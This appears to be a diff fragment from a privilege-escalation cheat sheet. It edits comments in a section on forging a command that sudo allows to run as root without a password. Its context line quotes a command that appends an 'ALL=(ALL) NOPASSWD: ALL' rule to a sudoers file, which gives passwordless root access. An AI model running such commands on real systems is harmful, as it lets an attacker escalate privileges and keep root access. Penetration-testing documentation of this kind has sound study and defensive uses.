@@ -311,9 +311,8 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 
 ### Command Forgery (NOPASSWD)
 ```bash
-# If a command can be executed as root with NOPASSWD 
-# Example `sudo -l output: `(root) NOPASSWD: /path/to/somecmd`
-# This works when there's a misconfiguration in the sudo environment
+# This works when a command can be executed as root with NOPASSWD and there's a misconfiguration in the sudo environment 
+# Example `sudo -l` output: `(root) NOPASSWD: /path/to/somecmd`
 
 # 1. Creat the same command
 cat << EOF > /tmp/somecmd
